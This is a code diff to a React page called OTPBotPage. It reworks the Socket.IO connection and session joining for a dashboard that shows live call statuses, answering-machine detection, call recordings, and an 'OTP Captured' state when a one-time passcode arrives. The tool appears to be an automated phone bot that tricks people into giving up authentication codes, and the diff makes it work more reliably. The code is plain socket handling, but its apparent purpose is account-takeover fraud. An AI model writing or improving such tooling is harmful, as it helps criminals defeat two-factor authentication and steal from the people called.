@@ -110,76 +110,87 @@ const OTPBotPage = () => {
         };
     }, [isCallActive]);
 
-    // Connect to Socket.IO when session starts
+    // Connect to Socket.IO on component mount (not waiting for sessionId)
     useEffect(() => {
-        if (sessionId && !socket) {
-            console.log('Connecting to Socket.IO at:', BACKEND_URL);
-            const newSocket = io(BACKEND_URL, {
-                transports: ['websocket', 'polling'],
-                path: '/api/socket.io/',
-                reconnection: true,
-                reconnectionAttempts: 5,
-                reconnectionDelay: 1000,
+        console.log('Connecting to Socket.IO at:', BACKEND_URL);
+        const newSocket = io(BACKEND_URL, {
+            transports: ['websocket', 'polling'],
+            path: '/api/socket.io/',
+            reconnection: true,
+            reconnectionAttempts: 10,
+            reconnectionDelay: 500,
+        });
+
+        newSocket.on('connect', () => {
+            console.log('Socket connected, sid:', newSocket.id);
+        });
+
+        newSocket.on('connect_error', (error) => {
+            console.error('Socket connection error:', error);
+        });
+
+        newSocket.on('call_log', (log) => {
+            console.log('Log received:', log);
+            setLogs(prev => [...prev, log]);
+            
+            // Handle OTP captured
+            if (log.type === 'otp' && log.data?.otp) {
+                setOtpReceived(log.data.otp);
+                setSessionStatus('OTP Captured');
+            }
+            
+            // Handle AMD detection
+            if (log.type === 'amd' && log.data?.result) {
+                setAmdResult(log.data.result);
+            }
+            
+            // Handle recording URL
+            if (log.type === 'recording' && log.data?.fileId) {
+                // Use our proxy endpoint to download the recording
+                const recordingDownloadUrl = `${API}/otp/recording/download/${log.data.fileId}`;
+                setRecordingUrl(recordingDownloadUrl);
+            } else if (log.type === 'recording' && log.data?.url) {
+                setRecordingUrl(log.data.url);
+            }
+            
+            // Handle call completed
+            if (log.type === 'info' && log.message.includes('Call ended')) {
+                setIsCallActive(false);
+                setSessionStatus('Completed');
+            }
+            
+            // Update status based on log type
+            if (log.type === 'ringing') setSessionStatus('Ringing');
+            if (log.type === 'answered') setSessionStatus('Answered');
+            if (log.type === 'busy') setSessionStatus('Busy');
+            if (log.type === 'no_answer') setSessionStatus('No Answer');
+            if (log.type === 'rejected') setSessionStatus('Rejected');
+        });
+
+        newSocket.on('disconnect', () => {
+            console.log('Socket disconnected');
+        });
+
+        setSocket(newSocket);
+
+        return () => {
+            newSocket.close();
+        };
+    }, []);
+
+    // Join session when sessionId is available
+    useEffect(() => {
+        if (sessionId && socket && socket.connected) {
+            console.log('Joining session:', sessionId);
+            socket.emit('join_session', { session_id: sessionId });
+        } else if (sessionId && socket) {
+            // Socket exists but not connected yet, wait for connect
+            socket.on('connect', () => {
+                console.log('Socket connected, joining session:', sessionId);
+                socket.emit('join_session', { session_id: sessionId });
             });
-
-            newSocket.on('connect', () => {
-                console.log('Socket connected, sid:', newSocket.id);
-                newSocket.emit('join_session', { session_id: sessionId });
-            });
-
-            newSocket.on('connect_error', (error) => {
-                console.error('Socket connection error:', error);
-            });
-
-            newSocket.on('call_log', (log) => {
-                console.log('Log received:', log);
-                setLogs(prev => [...prev, log]);
-                
-                // Handle OTP captured
-                if (log.type === 'otp' && log.data?.otp) {
-                    setOtpReceived(log.data.otp);
-                    setSessionStatus('OTP Captured');
-                }
-                
-                // Handle AMD detection
-                if (log.type === 'amd' && log.data?.result) {
-                    setAmdResult(log.data.result);
-                }
-                
-                // Handle recording URL
-                if (log.type === 'recording' && log.data?.fileId) {
-                    // Use our proxy endpoint to download the recording
-                    const recordingDownloadUrl = `${API}/otp/recording/download/${log.data.fileId}`;
-                    setRecordingUrl(recordingDownloadUrl);
-                } else if (log.type === 'recording' && log.data?.url) {
-                    setRecordingUrl(log.data.url);
-                }
-                
-                // Handle call completed
-                if (log.type === 'info' && log.message.includes('Call ended')) {
-                    setIsCallActive(false);
-                    setSessionStatus('Completed');
-                }
-                
-                // Update status based on log type
-                if (log.type === 'ringing') setSessionStatus('Ringing');
-                if (log.type === 'answered') setSessionStatus('Answered');
-                if (log.type === 'busy') setSessionStatus('Busy');
-                if (log.type === 'no_answer') setSessionStatus('No Answer');
-                if (log.type === 'rejected') setSessionStatus('Rejected');
-            });
-
-            newSocket.on('disconnect', () => {
-                console.log('Socket disconnected');
-            });
-
-            setSocket(newSocket);
-
-            return () => {
-                newSocket.close();
-            };
         }
-    }, [sessionId]);
+    }, [sessionId, socket]);
 
     const getAuthHeaders = () => {
         const token = localStorage.getItem('token');
